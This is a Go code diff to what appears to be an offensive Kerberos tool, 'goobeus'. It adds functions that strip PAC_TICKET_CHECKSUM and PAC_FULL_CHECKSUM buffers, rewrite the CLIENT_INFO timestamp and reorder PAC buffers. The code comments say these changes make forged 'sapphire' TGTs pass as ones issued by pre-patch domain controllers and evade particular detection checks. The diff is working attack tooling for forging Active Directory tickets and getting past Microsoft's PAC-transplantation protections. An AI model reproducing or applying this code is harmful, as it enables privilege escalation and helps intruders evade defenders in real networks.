@@ -6,6 +6,7 @@ import (
 	"crypto/md5"
 	"encoding/binary"
 	"fmt"
+	"time"
 
 	"github.com/goobeus/goobeus/pkg/crypto"
 )
@@ -887,22 +888,10 @@ const (
 // PAC transplantation attacks like sapphire. DCs predating KB5020805 never emit it.
 const FullChecksumType uint32 = 19
 
-// RemovePACFullChecksum strips the PAC_FULL_CHECKSUM buffer (type 19) from the PAC.
-//
-// The buffer is recomputed by the KDC on patched DCs and would need to be
-// recomputed after any PAC mutation to remain valid. Removing it instead makes
-// the PAC look like it was issued by a pre-KB5020805 DC — detections that
-// validate type-19 if present but don't require its presence will skip validation.
-//
-// Structural: removes one 16-byte buffer-info entry from the header array and
-// the (aligned) 16 bytes of buffer data, then rewrites all remaining buffers'
-// data offsets to account for both shrinks. Decrements cBuffers by 1.
-//
-// Must run BEFORE re-signing so that SERVER_CHECKSUM and KDC_CHECKSUM cover
-// the new (shrunk) PAC layout.
-//
-// Returns the modified PAC bytes and 1 if a type-19 buffer was removed, 0 otherwise.
-func RemovePACFullChecksum(pacData []byte) ([]byte, int) {
+// removePACBuffer is the generic helper used by RemovePACFullChecksum and
+// RemovePACTicketChecksum. It removes the first buffer matching bufType from
+// the PAC, shrinking the header and rewriting remaining buffers' offsets.
+func removePACBuffer(pacData []byte, bufType uint32) ([]byte, int) {
 	parsed, err := ParsePACForSigning(pacData)
 	if err != nil {
 		return pacData, 0
@@ -911,7 +900,7 @@ func RemovePACFullChecksum(pacData []byte) ([]byte, int) {
 	var targetBuf *PACBuffer
 	targetIdx := -1
 	for i := range parsed.Buffers {
-		if parsed.Buffers[i].Type == FullChecksumType {
+		if parsed.Buffers[i].Type == bufType {
 			targetBuf = &parsed.Buffers[i]
 			targetIdx = i
 			break
@@ -969,6 +958,213 @@ func RemovePACFullChecksum(pacData []byte) ([]byte, int) {
 	}
 
 	return newPAC, 1
+}
+
+// RemovePACFullChecksum strips the PAC_FULL_CHECKSUM buffer (type 19) from the PAC.
+//
+// The buffer is recomputed by the KDC on patched DCs and would need to be
+// recomputed after any PAC mutation to remain valid. Removing it instead makes
+// the PAC look like it was issued by a pre-KB5020805 DC — detections that
+// validate type-19 if present but don't require its presence will skip validation.
+//
+// Structural: removes one 16-byte buffer-info entry from the header array and
+// the (aligned) 16 bytes of buffer data, then rewrites all remaining buffers'
+// data offsets to account for both shrinks. Decrements cBuffers by 1.
+//
+// Must run BEFORE re-signing so that SERVER_CHECKSUM and KDC_CHECKSUM cover
+// the new (shrunk) PAC layout.
+//
+// Returns the modified PAC bytes and 1 if a type-19 buffer was removed, 0 otherwise.
+func RemovePACFullChecksum(pacData []byte) ([]byte, int) {
+	return removePACBuffer(pacData, FullChecksumType)
+}
+
+// filetimeEpochDiff is the number of 100-nanosecond intervals between
+// 1601-01-01 UTC (Windows FILETIME epoch) and 1970-01-01 UTC (Unix epoch).
+const filetimeEpochDiff = 116444736000000000
+
+// timeToFILETIME converts a Go time.Time to a Windows FILETIME uint64
+// (100-nanosecond intervals since 1601-01-01 UTC).
+func timeToFILETIME(t time.Time) uint64 {
+	return uint64(t.UnixNano()/100) + filetimeEpochDiff
+}
+
+// SyncClientInfoTimestamp rewrites the ClientId FILETIME at the start of the
+// CLIENT_INFO buffer (MS-PAC 2.7) to match the provided time. On legit TGTs
+// issued by the KDC, CLIENT_INFO.ClientId is set to the ticket's AuthTime.
+// Sapphire tickets inherit the S4U2Self issuance time, which doesn't match
+// the forged TGT's AuthTime — a consistency-check detection would flag this.
+//
+// Writes 8 bytes (little-endian uint64) at the start of the CLIENT_INFO
+// buffer data. NameLength and Name fields that follow are preserved.
+//
+// Must run BEFORE re-signing so SERVER_CHECKSUM and KDC_CHECKSUM cover the
+// new bytes.
+//
+// Returns the modified PAC bytes and 1 if the buffer was updated, 0 if
+// CLIENT_INFO wasn't present.
+func SyncClientInfoTimestamp(pacData []byte, t time.Time) ([]byte, int) {
+	parsed, err := ParsePACForSigning(pacData)
+	if err != nil {
+		return pacData, 0
+	}
+
+	clientInfoBuf := parsed.GetBuffer(ClientInfoType)
+	if clientInfoBuf == nil || clientInfoBuf.Size < 8 {
+		return pacData, 0
+	}
+
+	out := make([]byte, len(pacData))
+	copy(out, pacData)
+
+	offset := int(clientInfoBuf.Offset)
+	if offset+8 > len(out) {
+		return pacData, 0
+	}
+
+	binary.LittleEndian.PutUint64(out[offset:offset+8], timeToFILETIME(t))
+
+	return out, 1
+}
+
+// canonicalBufferOrder is the MS-PAC buffer ordering observed from KDC-issued
+// PACs (both pre- and post-KB5020805). Buffers not listed here preserve their
+// relative input order at the end of the PAC.
+var canonicalBufferOrder = []uint32{
+	LogonInfoType,      // 1
+	ClientInfoType,     // 10
+	UPNDNSInfoType,     // 12
+	ServerChecksumType, // 6
+	KDCChecksumType,    // 7
+	TicketChecksumType, // 16
+	FullChecksumType,   // 19
+	AttributesType,     // 17
+	RequestorType,      // 18
+}
+
+// NormalizePACBufferOrder reorders the PAC's buffers to match the canonical
+// KDC-native layout. Sapphire tickets produced by goobeus carry buffers in
+// a non-canonical order (checksums immediately after LOGON_INFO, before
+// CLIENT_INFO and UPN_DNS_INFO) because of how AddKB5008380Buffers appends
+// new entries. Detections that check buffer ordering as a secondary IOC
+// would flag this.
+//
+// Preserves all buffer contents byte-for-byte. Rewrites only the header's
+// buffer-info array and recomputes data offsets (8-byte aligned).
+//
+// Must run BEFORE re-signing so SERVER_CHECKSUM and KDC_CHECKSUM cover the
+// reordered layout.
+//
+// Returns the modified PAC bytes and 1 if any reordering happened, 0 if the
+// buffers were already canonical.
+func NormalizePACBufferOrder(pacData []byte) ([]byte, int) {
+	parsed, err := ParsePACForSigning(pacData)
+	if err != nil {
+		return pacData, 0
+	}
+
+	priority := make(map[uint32]int)
+	for i, t := range canonicalBufferOrder {
+		priority[t] = i
+	}
+
+	// Build sorted order: canonical types first (in canonical order), unknowns last (preserving input order).
+	type entry struct {
+		idx int
+		key int
+	}
+	entries := make([]entry, len(parsed.Buffers))
+	for i := range parsed.Buffers {
+		t := parsed.Buffers[i].Type
+		if p, ok := priority[t]; ok {
+			entries[i] = entry{idx: i, key: p}
+		} else {
+			entries[i] = entry{idx: i, key: len(canonicalBufferOrder) + i}
+		}
+	}
+
+	// Stable-sort by key
+	sorted := make([]entry, len(entries))
+	copy(sorted, entries)
+	for i := 1; i < len(sorted); i++ {
+		for j := i; j > 0 && sorted[j-1].key > sorted[j].key; j-- {
+			sorted[j-1], sorted[j] = sorted[j], sorted[j-1]
+		}
+	}
+
+	// Check if already canonical
+	changed := false
+	for i := range sorted {
+		if sorted[i].idx != i {
+			changed = true
+			break
+		}
+	}
+	if !changed {
+		return pacData, 0
+	}
+
+	// Compute layout: header (8) + info array + 8-byte-aligned data sections
+	numBufs := len(parsed.Buffers)
+	infoArraySize := numBufs * 16
+	dataStart := 8 + infoArraySize
+	dataStart = (dataStart + 7) &^ 7 // align to 8
+
+	// Walk the reordered buffers to compute total size and per-buffer offsets
+	newOffsets := make([]uint64, numBufs)
+	off := dataStart
+	for i, e := range sorted {
+		off = (off + 7) &^ 7
+		newOffsets[i] = uint64(off)
+		off += int(parsed.Buffers[e.idx].Size)
+	}
+	newPACSize := off
+	// Pad total size to 8-byte boundary for safety
+	newPACSize = (newPACSize + 7) &^ 7
+
+	newPAC := make([]byte, newPACSize)
+	copy(newPAC[0:8], pacData[0:8]) // header unchanged
+
+	infoOff := 8
+	for i, e := range sorted {
+		buf := &parsed.Buffers[e.idx]
+		binary.LittleEndian.PutUint32(newPAC[infoOff:], buf.Type)
+		binary.LittleEndian.PutUint32(newPAC[infoOff+4:], buf.Size)
+		binary.LittleEndian.PutUint64(newPAC[infoOff+8:], newOffsets[i])
+		infoOff += 16
+
+		dataOff := int(newOffsets[i])
+		oldStart := int(buf.Offset)
+		oldEnd := oldStart + int(buf.Size)
+		if oldEnd > len(pacData) {
+			continue
+		}
+		copy(newPAC[dataOff:], pacData[oldStart:oldEnd])
+	}
+
+	return newPAC, 1
+}
+
+// RemovePACTicketChecksum strips the PAC_TICKET_CHECKSUM buffer (type 16) from
+// the PAC.
+//
+// PAC_TICKET_CHECKSUM (MS-PAC 2.15, added in KB5008380, July 2021) is a keyed
+// HMAC over the entire EncTicketPart encoding (with the PAC's own signature
+// fields zeroed). Its explicit purpose is to prevent PAC transplantation between
+// tickets — exactly what sapphire does. Because goobeus transplants a PAC from
+// an S4U2Self service ticket into a forged TGT's EncTicketPart (with cname
+// swapped and re-encrypted), the inherited TICKET_CHECKSUM is invalid.
+//
+// Removing the buffer makes the PAC look pre-KB5008380. Detections that
+// validate type-16 if present but fail open on absence will skip validation.
+//
+// WARNING: DCs in strict KB5008380 enforcement mode may REJECT tickets that
+// lack a valid PAC_TICKET_CHECKSUM. If auth fails after stripping, the DC is
+// enforcing and a proper recomputation (Option B) would be needed instead.
+//
+// Returns the modified PAC bytes and 1 if a type-16 buffer was removed, 0 otherwise.
+func RemovePACTicketChecksum(pacData []byte) ([]byte, int) {
+	return removePACBuffer(pacData, TicketChecksumType)
 }
 
 // RewritePACAttributesRequested rewrites PAC_ATTRIBUTES_INFO.Flags from
